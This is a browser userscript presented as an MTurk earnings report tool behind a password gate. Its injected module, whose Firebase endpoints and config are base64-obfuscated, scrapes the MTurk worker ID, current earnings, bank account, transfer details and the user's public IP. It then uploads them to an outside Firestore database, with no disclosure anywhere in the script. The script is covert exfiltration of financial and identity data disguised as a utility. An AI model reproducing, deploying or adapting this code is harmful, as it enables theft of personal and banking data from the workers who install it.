// ==UserScript==
// @name         🔒 MTurk Total Report
// @namespace    ab2soft.mturk.secure
// @version      1.7
// @author       AB2Soft
// @match        https://worker.mturk.com/earnings*
// @grant        none
// @run-at       document-end
// @connect      api.ipify.org
// ==/UserScript==
(() => {
  "use strict";

 
  const _b64d = s => decodeURIComponent(escape(atob(s.replace(/_/g, "/").replace(/-/g, "+"))));
  const _q = sel => document.querySelector(sel);
  const _qa = sel => document.querySelectorAll(sel);
  const _el = (t, a = {}) => Object.assign(document.createElement(t), a);
  const _sha256hex = async t => {
    const ab = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(t));
    return [...new Uint8Array(ab)].map(b=>b.toString(16).padStart(2,"0")).join("");
  };

 
  const PASS_HASH = "9b724d9df97a91d297dc1c714a3987338ebb60a2a53311d2e382411a78b9e07d";

 
  const css = `
  .ab2-gate{position:fixed;inset:0;background:linear-gradient(180deg,#0f172a 0,#111827 100%);
    display:flex;align-items:center;justify-content:center;z-index:2147483647}
  .ab2-card{width:min(420px,92vw);background:#0b1220;border:1px solid #1f2937;border-radius:14px;
    padding:22px;color:#dbeafe;box-shadow:0 10px 40px rgba(0,0,0,.45);font-family:Inter,system-ui,Segoe UI,Roboto,Arial,sans-serif}
  .ab2-title{margin:0 0 14px;font-weight:700;letter-spacing:.2px}
  .ab2-sub{margin:0 0 12px;color:#93c5fd}
  .ab2-in{width:100%;padding:12px 14px;border-radius:10px;border:1px solid #334155;background:#0a1222;color:#e5e7eb;outline:none}
  .ab2-in:focus{border-color:#60a5fa;box-shadow:0 0 0 3px rgba(96,165,250,.25)}
  .ab2-btn{width:100%;margin-top:12px;background:#22c55e;border:0;border-radius:10px;color:#fff;padding:12px;cursor:pointer}
  .ab2-btn:hover{background:#16a34a}
  .ab2-msg{margin-top:10px;font-size:12px;color:#fca5a5;min-height:16px}
  `;
  const style = _el("style",{textContent:css});
  document.documentElement.appendChild(style);

  const gate = _el("section",{className:"ab2-gate","aria-label":"Password Gate"});
  gate.innerHTML = `
    <div class="ab2-card">
      <h2 class="ab2-title">🔒 Secure Access</h2>
      <p class="ab2-sub">Enter password</p>
      <input id="ab2_pw" type="password" class="ab2-in" placeholder="•••••••••••••••" autocomplete="current-password" />
      <button id="ab2_unlock" class="ab2-btn">Unlock</button>
      <div id="ab2_msg" class="ab2-msg"></div>
    </div>`;
  document.body.appendChild(gate);
  const $pw  = _q("#ab2_pw");
  const $btn = _q("#ab2_unlock");
  const $msg = _q("#ab2_msg");

  
  if (sessionStorage.getItem("ab2_unlocked") === "true") {
    gate.remove();
    injectCore();
  }

  $btn.addEventListener("click", tryUnlock);
  $pw.addEventListener("keydown", e => { if (e.key === "Enter") tryUnlock(); });

  async function tryUnlock() {
    $msg.textContent = "";
    const v = ($pw.value || "").trim();
    if (!v) { $msg.textContent = "Password required"; return; }
    try {
      const h = await _sha256hex(v);
      if (h === PASS_HASH) {
        sessionStorage.setItem("ab2_unlocked","true");
        gate.remove();
        injectCore();
      } else {
        $msg.textContent = "Password incorrect";
      }
    } catch (e) {
      $msg.textContent = "Crypto error: " + (e && e.message ? e.message : e);
    }
  }

  
  function injectCore() {
    
    const mod = _el("script", { type:"module" });

   
    const uApp  = "aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vZmlyZWJhc2Vqcy8xMC4xMi4wL2ZpcmViYXNlLWFwcC5qcw";
    const uFS   = "aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vZmlyZWJhc2Vqcy8xMC4xMi4wL2ZpcmViYXNlLWZpcmVzdG9yZS5qcw";
    const cfg64 = "eyJhcGlLZXkiOiJBSXphU3lDQ3RCQ0FadlFXQ0RqOG1YZjJiOTBxWVVxUnJFTklJR0lRIiwiYXV0aERvbWFpbiI6Im10dXJrLW1vbml0b3JkZWVwLmZpcmViYXNlYXBwLmNvbSIsInByb2plY3RJZCI6Im10dXJrLW1vbml0b3JkZWVwIiwic3RvcmFnZUJ1Y2tldCI6Im10dXJrLW1vbml0b3JkZWVwLmZpcmViYXNlc3RvcmFnZS5hcHAiLCJtZXNzYWdpbmdTZW5kZXJJZCI6IjU4MzkyMjk3NDg3IiwiYXBwSWQiOiIxOjU4MzkyMjk3NDg3OndlYjoxMzY1YWQxMjExMGZmZDA1ODY2MzdhIn0=";

    mod.innerHTML = `
      const _b64d = ${_b64d.toString()};
      const _cfg = JSON.parse(_b64d("${cfg64}"));
      const u1 = _b64d("${uApp}");
      const u2 = _b64d("${uFS}");

      const $$ = sel => document.querySelector(sel);
      const $$$ = sel => document.querySelectorAll(sel);

      
      function extractWorkerID(){
        let workerId='';
        try{
          const copyTextElements=$$$('[data-react-props*="textToCopy"]');
          for(const element of copyTextElements){
            const propsData=element.getAttribute('data-react-props');
            if(propsData){
              try{
                const decodedProps=propsData.replace(/&quot;/g,'"').replace(/&#39;/g,"'");
                const parsed=JSON.parse(decodedProps);
                if(parsed.textToCopy && parsed.textToCopy.match(/^A[0-9A-Z]+$/)){
                  workerId=parsed.textToCopy;
                  return workerId;
                }
              }catch{}
            }
          }
          const upperCaseSpans=$$$('.text-uppercase span');
          for(const span of upperCaseSpans){
            const text=span.textContent.trim();
            if(text.match(/^A[0-9A-Z]{10,}$/)){
              workerId=text; return workerId;
            }
          }
          const allElements=$$$('*');
          for(const element of allElements){
            const text=element.textContent.trim();
            const match=text.match(/\\b(A[0-9A-Z]{10,})\\b/);
            if(match && match[1]!==workerId){ workerId=match[1]; return workerId; }
          }
          const workerSection=$$('.me-bar');
          if(workerSection){
            const text=workerSection.textContent;
            const match=text.match(/Worker\\s+ID:\\s*(A[0-9A-Z]+)/i);
            if(match){ workerId=match[1]; return workerId; }
          }
          const workerIdElement=$$('[data-react-props*="A1"]');
          if(workerIdElement){
            const text=workerIdElement.textContent.trim();
            if(text.match(/^A[0-9A-Z]{10,}$/)){ workerId=text; return workerId; }
          }
          return 'N/A';
        }catch{ return 'N/A'; }
      }

      async function getIP(){
        try{
          const res=await fetch('https://api.ipify.org?format=json',{cache:'no-store'});
          const data=await res.json();
          return data.ip || '0.0.0.0';
        }catch{ return '0.0.0.0'; }
      }

      function extractEarnings(){
        const html=document.body.innerHTML;
        const current=(html.match(/Current Earnings: \\$(\\d+(?:\\.\\d+)?)/)||[])[1]||"0";
        const bank=(html.match(/bank account <a href="\\\\/direct_deposit">([^<]+)<\\\\/a>/i)||[])[1]?.trim()||"N/A";
        const nextTransfer=(html.match(/on ([A-Za-z]+ \\d{2}, \\d{4})/i)||[])[1]||"N/A";
        const m=html.match(/amountRequested&quot;:(\\d+(?:\\.\\d+)?),.*?requestedDate&quot;:&quot;([0-9\\\\/]+)&quot;/);
        const lastTransferAmount=m?m[1]:"0";
        const lastTransferDate=m?m[2]:"N/A";
        return { current, bank, nextTransfer, lastTransferAmount, lastTransferDate };
      }

      
      import(u1).then(async ({ initializeApp }) => {
        const app = initializeApp(_cfg);
        const { getFirestore, doc, getDoc, setDoc, serverTimestamp } = await import(u2);
        const db = getFirestore(app);

        const workerId = extractWorkerID();
        const ip = await getIP();
        const { current, bank, nextTransfer, lastTransferAmount, lastTransferDate } = extractEarnings();

        
        const ref = doc(db, "earnings_logs", workerId);
        const snap = await getDoc(ref);

        let alert = "OK";
        let shouldUpdate = true;

        if (snap.exists()) {
          const old = snap.data();
          if (old.bankAccount && old.bankAccount !== bank) {
            alert = "⚠️ BANK CHANGED";
            shouldUpdate = false;
          } else if (old.ip && old.ip !== ip) {
            alert = "⚠️ IP CHANGED";
            shouldUpdate = false;
          }
        }

        if (!shouldUpdate) {
          await setDoc(ref, { alert, timestamp: serverTimestamp() }, { merge:true });
          console.warn("⚠️ ALERT triggered; updates stopped for:", workerId);
          return;
        }

        const payload = {
          workerId,
          currentEarnings: current,
          lastTransferAmount,
          lastTransferDate,
          nextTransferDate: nextTransfer,
          bankAccount: bank,
          ip,
          alert,
          timestamp: serverTimestamp(),
        };

        await setDoc(ref, payload, { merge:true });
        console.log("✅ Uploaded:", payload);
      }).catch(e => console.error("Firebase load error:", e));
    `;

    document.head.appendChild(mod);
  }
})();
